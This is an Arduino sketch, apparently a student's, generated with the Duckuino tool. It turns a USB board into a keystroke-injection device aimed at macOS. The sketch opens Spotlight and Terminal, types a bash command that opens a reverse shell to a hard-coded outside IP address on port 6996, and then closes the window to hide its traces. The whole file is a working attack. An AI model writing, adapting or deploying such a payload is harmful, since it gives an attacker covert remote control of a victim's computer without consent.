
/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // spawns a reverse shell
  // Shrey Somaiya z5257343
  // 2 April 2020
  // Set default delay 100
  // Command + Space ==> spotlight search
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  // Search for termina
  delay(750);
  Keyboard.print(F("terminal"));

  delay(500);
  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("bash"));
  
  delay(500);
  typeKey(KEY_RETURN);

  // spawns a reverse shell
  delay(500);
  Keyboard.print(F("/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &"));

  typeKey(KEY_RETURN);

  // command q - remove all traces
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);
  
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
